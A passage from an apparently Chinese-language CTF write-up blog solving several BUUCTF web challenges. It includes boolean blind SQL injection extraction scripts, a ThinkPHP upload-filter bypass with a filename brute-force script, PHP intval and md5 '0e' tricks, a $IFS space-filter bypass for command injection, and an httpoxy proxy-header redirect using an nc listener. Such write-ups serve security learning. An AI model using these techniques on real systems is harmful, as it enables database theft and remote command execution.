class="code"><pre><span class="line">error_reporting(0);  </span><br><span class="line">include &apos;takeip.php&apos;; </span><br><span class="line">ini_set(&apos;open_basedir&apos;,&apos;.&apos;);  </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;Merak&apos;]))&#123;  </span><br><span class="line">    highlight_file(__FILE__);  </span><br><span class="line">    die();  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123;  </span><br><span class="line">    $v = base64_decode($v);  </span><br><span class="line">    $re = &apos;&apos;;  </span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123;  </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*2 );  </span><br><span class="line">    &#125;  </span><br><span class="line">    return $re;  </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;Local access only!&apos;.&quot;&lt;br/&gt;&quot;; </span><br><span class="line">$ip = getIp(); </span><br><span class="line">if($ip!=&apos;127.0.0.1&apos;) </span><br><span class="line">echo &quot;Sorry,you don&apos;t have permission!  Your ip is :&quot;.$ip; </span><br><span class="line">if($ip === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;2333&apos;]) === &apos;todat is a happy day&apos; )&#123; </span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&apos;file&apos;]); </span><br><span class="line">echo file_get_contents(change($_GET[&apos;file&apos;])); &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里ip的问题用client-ip可以过，然后就是过file_get_contents。这里也可以用data伪协议。<br><code>data:text/plain,totat is a happy day</code>即可。<br>最后就是想办法根据change写一个函数来访问flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = &apos;&apos;</span><br><span class="line">for i,c in enumerate(&apos;flag.php&apos;):</span><br><span class="line">  s += chr(ord(c) - i*2)</span><br><span class="line">最后base64编码一下就行</span><br></pre></td></tr></table></figure>
+<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>这道题应该是做过了类似的题目，所以有些经验了，过得比较轻松。<br>果然是重在积累嘛。</p>
+<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>知识点</p>
+<ul>
+<li>盲注</li>
+</ul>
+<hr>
+<p>进去就提示查成绩。<br>注意到url的变化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://247130bd-c786-443d-8c48-8cfa5a83d9e7.node3.buuoj.cn/?stunum=1</span><br><span class="line">这里存在1~5</span><br><span class="line">试一下1+1可以查到，2-1也可以查到，基本可以确定有sql洞了。但是单，双引号没反应。</span><br><span class="line">尝试abs(-1),可以用。尝试(ascii(&apos;a)&gt;0),查到了。随后利用bool盲注就能查到数据了。</span><br></pre></td></tr></table></figure>
+<p>这里写了一个小脚本用来跑数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://247130bd-c786-443d-8c48-8cfa5a83d9e7.node3.buuoj.cn/?stunum=&quot;</span><br><span class="line">payload = &quot;1^(ascii(substr((select/**/database()),1,1))&gt;127)^1&quot;</span><br><span class="line">s = &apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 127</span><br><span class="line">    mid = 32 + 127 // 2</span><br><span class="line">    while(low != high):</span><br><span class="line">        # payload = f&quot;1^(ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&quot; #数据库名，ctf</span><br><span class="line">        # payload = f&quot;1^(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;ctf&apos;),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&quot; #flag,scroe</span><br><span class="line">        # payload = f&quot;1^(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag&apos;),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&quot; #flag,value</span><br><span class="line">        payload = f&quot;1^(ascii(substr((select/**/group_concat(value)/**/from/**/flag),&#123;i&#125;,1))&gt;&#123;mid&#125;)^1&quot; #拿到flag</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        if &apos;Hi admin&apos; in res.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    s += chr(high)</span><br><span class="line">        # print(res.text)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>
+<p>第一次用二分法来跑，速度还是比逐个试快多了。</p>
+<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>这道题主要是发现注入点和写代码跑两个点。<br>做题的时候还有一点脑抽了，跑表名的时候把table_schema写成table_name了。</p>
+<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>知识点</p>
+<ul>
+<li>Thinkphp默认上传点/index.php/home/Index/your_function_name，具体参考<a href="http://document.thinkphp.cn/manual_3_2.html#define_controller" target="_blank" rel="noopener">thinkphp开发手册</a></li>
+<li>upload函数默认参数。Think\Upload类的upload函数，不传参的时候默认把整个$_FILES数组作为参数。</li>
+<li>$upload-&gt;upload()的savename生成规则，使用了unique，可以爆破。<br>参考wp<a href="https://www.chabug.org/audit/1035.html" target="_blank" rel="noopener">wp</a></li>
+</ul>
+<hr>
+<p>进去直接给源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Home\Controller;</span><br><span class="line"></span><br><span class="line">use Think\Controller;</span><br><span class="line"></span><br><span class="line">class IndexController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">    public function upload()</span><br><span class="line">    &#123;</span><br><span class="line">        $uploadFile = $_FILES[&apos;file&apos;] ;</span><br><span class="line">        </span><br><span class="line">        if (strstr(strtolower($uploadFile[&apos;name&apos;]), &quot;.php&quot;) ) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = new \Think\Upload();// 实例化上传类</span><br><span class="line">        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小</span><br><span class="line">        $upload-&gt;allowExts  = array(&apos;jpg&apos;, &apos;gif&apos;, &apos;png&apos;, &apos;jpeg&apos;);// 设置附件上传类型</span><br><span class="line">        $upload-&gt;rootPath = &apos;./Public/Uploads/&apos;;// 设置附件上传目录</span><br><span class="line">        $upload-&gt;savePath = &apos;&apos;;// 设置附件上传子目录</span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        if(!$info) &#123;// 上传错误提示错误信息</span><br><span class="line">          $this-&gt;error($upload-&gt;getError());</span><br><span class="line">          return;</span><br><span class="line">        &#125;else&#123;// 上传成功 获取上传文件信息</span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&apos;file&apos;][&apos;savepath&apos;].$info[&apos;file&apos;][&apos;savename&apos;] ;</span><br><span class="line">          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据前面给的开发手册，这里是在定义一个控制器类，上传点在/index.php/home/index/upload处。<br>往下看，发现upload函数里只对$_FILES的file字段做了后缀名不能为php的判断,这里可以上传多个文件，只要字段名不为file就可以绕过这个检查。<br>而根据前面的wp，这里的后缀限制使用不正确，相当于没有。成功上传后返回字段为file的文件名。而前面也提到，savename的生成规则是unique。<br>这个函数是根据时间来生成唯一文件名的。可以爆破。</p>
+<hr>
+<p>上传文件如下<br><img src="https://i.loli.net/2020/04/22/eGl4QH7OaqrNJ9i.png" alt="Snipaste_2020-04-22_10-43-12.png"><br>根据返回的文件名，写脚本爆破php文件名，这里的文件名是16进制数字。而两个文件是同时上传的，文件名相差不会太远，上面的wp写了可以只修改最后三位。<br>然后写如下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://f2beb929-9e76-4a15-a46e-d82025977d03.node3.buuoj.cn/Public/Uploads/2020-04-22/5e9fa611a285e.txt&apos; #修改为你的url</span><br><span class="line">for i in &apos;abcdef0123456789&apos;:</span><br><span class="line">    for j in &apos;abcdef0123456789&apos;:</span><br><span class="line">        for k in &apos;abcdef0123456789&apos;:</span><br><span class="line">            url = f&apos;http://f2beb929-9e76-4a15-a46e-d82025977d03.node3.buuoj.cn/Public/Uploads/2020-04-22/5e9fa611a2&#123;i&#125;&#123;j&#125;&#123;k&#125;.php&apos;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(url)</span><br><span class="line">            if int(res.status_code) != 404:</span><br><span class="line">                print(&apos;found&apos;,url)</span><br><span class="line">                time.sleep(100000)</span><br></pre></td></tr></table></figure>
+<p>最后直接访问php文件就可以拿到flag了。</p>
+<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>最近的题目感觉越来越考验代码能力了，要会看还要会写。<br>但是最重要的还是信息检索能力吧，这里光上传点都找半天，tcl。</p>
+<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>知识点<br>-intval在php5.6及7.0下的特性<br>-md5的0e绕过<br>-$IFS$9绕过空格过滤</p>
+<hr>
+<p>这题进去没啥思路，扫后台发现robots.txt，有个假flag文件，这个文件的响应头里包含了真正要审计的源码。<br>在buuoj做题的时候返回了乱码，这里借用一下大佬做题的wp里头的源码<a href="https://www.gem-love.com/ctf/2176.html#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E" target="_blank" rel="noopener">wp</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    $num = $_GET[&apos;num&apos;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&apos;md5&apos;]))&#123;</span><br><span class="line">   $md5=$_GET[&apos;md5&apos;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&apos;get_flag&apos;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&apos;get_flag&apos;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第一题明显就是考intval了，这里查了一下，在官网发现如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(&apos;1e5&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">will return 1 on PHP 5.6 and PHP 7.0,</span><br><span class="line">but it will return 100000 on PHP 7.1.</span><br></pre></td></tr></table></figure>
+<p>而本题的php环境为5.5.38。这里还考到了一个字符串和数字相加的tips。<br>‘1e5’+1是会变成10001的，于是intval(‘1e5’)就为1，intval(‘1e5’ + 1)就变成了100001.<br>第一层就过去了</p>
+<hr>
+<p>第二层，看考点应该是考0e绕过，这里需要加密前加密后字符串都为0e开头且都为数字才能过。<br>查不到数据自己写脚本爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import re </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">par = re.compile(r&apos;\W&apos;)</span><br><span class="line">for i in range(1000000000000000000):</span><br><span class="line">    bs = bytes(f&apos;0e&#123;i&#125;&apos;,&apos;utf-8&apos;)</span><br><span class="line">    print(bs)</span><br><span class="line">    md5 = hashlib.md5(bs).hexdigest()</span><br><span class="line">    if md5[0:2] == &apos;0e&apos; and md5[2:].isdigit():</span><br><span class="line">        print(&apos;found&apos;,i)</span><br><span class="line">        print(hashlib.md5(bs).hexdigest())</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p>得到结果<br><strong>最后结果是0e215962017</strong></p>
+<hr>
+<p>第三层.不让有空格和cat。<br>这个前面做过类似的，利用$IFS$9绕过空格，而cat的代替品就太多了。tac，sort等一大串。<br>反而是找flag废了一番功夫(习惯性找根目录，其实就在本目录下)</p>
+<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>本题难度感觉还好，学到了intval这个点。还有字符串和数字相加这里，以前是不知道科学计数法数字会被解析成数字再相加的。</p>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>知识点</p>
+<ul>
+<li>盲注</li>
+</ul>
+<hr>
+<p>进去id参数。这里在这里fuzz一下，发现过滤了不少东西。<br>留下了select,substr,ascii,information_schema.tables,columns,from,where。<br>这里可以采用bool盲注的方式进行注入。<br>直接上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://e1337f9a-90e8-4570-8896-be14b2c767e0.node3.buuoj.cn/search.php?id=&apos;</span><br><span class="line">s = &apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 127</span><br><span class="line">    mid = (32 + 127) // 2</span><br><span class="line">    while(low != high):</span><br><span class="line">        # payload = f&apos;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&apos; # 表名 F1naI1y,Flaaaaag</span><br><span class="line">        # payload = f&quot;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=(&apos;F1naI1y&apos;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot; # 列名id,fl4gawsl</span><br><span class="line">        payload = f&quot;(ascii(substr((select(group_concat(password))from(F1naI1y)where(username)=(&apos;flag&apos;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot; # 拿flag。</span><br><span class="line">        res = requests.get(url + payload)</span><br><span class="line">        if &apos;NO!&apos; in res.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    s += chr(low)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>
+<p> flag在F1naI1y里。</p>
+<h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p> 这种盲注的题目也不是第一次了，应该说是做得多了比较熟练了，而且二分法爆破感觉真的比较快。。</p>
+<h2 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h2><p> 知识点</p>
+<ul>
+<li>cgi特性</li>
+</ul>
+<hr>
+<p> 进去就给了源码<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require __DIR__ . &apos;/vendor/autoload.php&apos;;</span><br><span class="line"></span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;flag&apos;])) &#123;</span><br><span class="line">    $client = new Client();</span><br><span class="line">    $response = $client-&gt;get(&apos;http://127.0.0.1:5000/api/eligible&apos;);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, TRUE);</span><br><span class="line">    if($data[&apos;success&apos;] === true) &#123;</span><br><span class="line">      echo system(&apos;/readflag&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">    highlight_file($_GET[&apos;file&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看phpinfo的信息，当时做题的时候其实还不知道有啥用处。<br>看这样子想拿flag就得让访问的返回体受控制。一开始首先想到ssrf，搜了一下Guzzle和ssrf内容。发现没有。<br>但是感觉入手点就在Guzzle这里了，于是搜cve。<a href="https://www.cvedetails.com/cve/CVE-2016-5385/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2016-5385/</a><br>真给我搜到了，看描述</p>
+<blockquote>
+<p>PHP through 7.0.8 does not attempt to address RFC 3875 section 4.1.18 namespace conflicts and therefore does not protect applications from the presence of untrusted client data in the HTTP_PROXY environment variable, which might allow remote attackers to redirect an application’s outbound HTTP traffic to an arbitrary proxy server via a crafted Proxy header in an HTTP request, as demonstrated by (1) an application that makes a getenv(‘HTTP_PROXY’) call or (2) a CGI configuration of PHP, aka an “httpoxy” issue.<br>可以用来做http重定向。直接搜这个cve的利用方式。<br>简单来说，当cgi/fastcgi使用RFC 3875模式的时候，会把请求的header头在前面加上HTTP_然后放到环境变量里面去，而我们知道，http_proxy这个环境变量是指定http协议代理的。<br>于是，只要请求的时候加上一个header头如下<br><img src="https://i.loli.net/2020/04/23/7a9xiPWZOnNd2Yv.png" alt="Snipaste_2020-04-23_00-43-33.png"></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy:http://ip:port</span><br></pre></td></tr></table></figure>
+<p>在服务器发出http请求的时候，就会将请求转发给HTTP_Proxy指定的代理服务器。<br>对本题而言，我一开始是想直接启动apache2然后返回{“success”:true}的，但是尝试失败了。<br>最后还是看了wp才构造出的payload。<br>这里贴一下<br><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">官方wp</a><br><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">漏洞参考</a><br>这个漏洞的利用条件：<br>-你的服务会对外请求资源<br>-你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）<br>-你的服务跑在PHP的CGI模式下(cgi, php-fpm)<br><strong>php在5.6.24修复了这个漏洞</strong><br>最后用了如下payload来拿flag<br>服务器新建一个test.txt文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">​</span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p>然后nc -lvvp 2333 &lt; test.txt<br>随后设置header头，发送请求即可拿到flag。<br>这道题卡住没做出来主要是返回的payload不会写，唉。<br>但是本次也是学到了利用nc来返回响应，也算是新的知识了。</p>
+<hr>
+<p>扩展讲一下官方wp的点，查看phpinfo，serverapi处给出了当前运行模式<br><img src="https://i.loli.net/2020/04/23/H674RwmyNehWAbX.png" alt="Snipaste_2020-04-23_00-52-06.png"><br>利用条件之一(在CGI模式下跑)<br>而Guzzlz这个插件，是默认使用HTTP_Proxy这个环境变量的，又满足了第二个条件。<br>而且本题对回环地址提出了http请求，三条件全满足，利用达成。</p>
+<h3 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h3><p>这道题也是新知识，但是除了最后的payload没构造出来之外应该都是没问题了。<br>果然是遇事不决搜cve(wu)。nc返回http响应还是第一次接触，以后应该还会用到。<br>顺带一提这个洞不止影响php，而是影响所有用cgi跑的程序。</p>
+<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>知识点</p>
+<ul>
+<li>koa框架目录结构</li>
+<li>jwt的secret为空时解密使用空算法</li>
+</ul>
+<hr>
+<p>进去分析一下源代码，发现如下js内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function login() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    const token = sessionStorage.getItem(&quot;token&quot;);</span><br><span class="line">    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123;status&#125; = data;</span><br><span class="line">            if(status) &#123;</span><br><span class="line">                document.location = &quot;/home&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function register() &#123;</span><br><span class="line">    const username = $(&quot;#username&quot;).val();</span><br><span class="line">    const password = $(&quot;#password&quot;).val();</span><br><span class="line">    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)</span><br><span class="line">        .done(function(data) &#123;</span><br><span class="line">            const &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(&apos;token&apos;, token);</span><br><span class="line">            document.location = &quot;/login&quot;;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        